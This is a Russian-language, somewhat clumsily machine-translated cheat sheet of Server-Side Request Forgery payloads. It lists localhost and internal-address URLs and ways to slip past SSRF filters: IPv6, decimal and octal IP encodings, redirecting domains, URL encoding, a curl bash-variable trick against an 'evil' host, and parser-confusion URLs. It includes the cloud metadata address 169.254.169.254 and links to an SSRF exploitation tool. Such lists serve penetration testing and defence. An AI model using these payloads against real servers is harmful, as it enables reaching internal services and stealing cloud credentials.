# Server-Side Request Forgery

> Подделка запроса на стороне сервера или SSRF - это уязвимость, при которой злоумышленник заставляет сервер выполнять запросы от их имени.



## Полезная нагрузка с Localhost 

* С использованием `localhost`
  ```powershell
  http://localhost:80
  http://localhost:443
  http://localhost:22
  ```
* С использованием `127.0.0.1`
  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:443
  http://127.0.0.1:22
  ```
* С использованием `0.0.0.0`
  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:443
  http://0.0.0.0:22
  ```


## Обход фильтров

### Обход с помощью HTTPS

```powershell
https://127.0.0.1/
https://localhost/
```

### Обход местный хост с [::] 

```powershell
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

```powershell
http://[0000::1]:80/
http://[0000::1]:25/ SMTP
http://[0000::1]:22/ SSH
http://[0000::1]:3128/ Squid
```

### Обход Localhost с перенаправлением домена 

| Domain                       | Redirect to |
|------------------------------|-------------|
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |


### Обход местный хост с CIDR 

IP -адреса от 127.0.0.0/8

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Обход с помощью десятичного IP -места 

```powershell
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/ = http://169.254.169.254
```

### Обход с помощью восьмиугольника 

Реализации отличаются от того, как обрабатывать восьмиугольный формат IPv4.

```sh
http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1
http://q177.0.0.1/ = http://127.0.0.1
...
```

### Обход с использованием IPv6/IPv4. 

[IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

```powershell
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
```

### Обход с использованием уродливых URL -адресов 

```powershell
localhost:+11211aaa
localhost:00011211aaaa
```

### Обход с помощью редкого адреса

Вы можете короткие IP-адреса, уронив нули 

```powershell
http://0/
http://127.1
http://127.0.1
```

### Обход с использованием кодирования URL 

[Одиночный или двойной кодирует определенный URL для обойти черный список ](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

```powershell
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

### Обход с использованием переменных BASH 

(curl only)

```powershell
curl -v "http://evil$google.com"
$google = ""
```

### Обход с использованием комбинации трюков 

```powershell
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```
## Инструменты

- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Автоматический инструмент Fuzzer и эксплуатации SSRF 
- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - сканер на основе Python, чтобы найти потенциальные параметры SSRF 

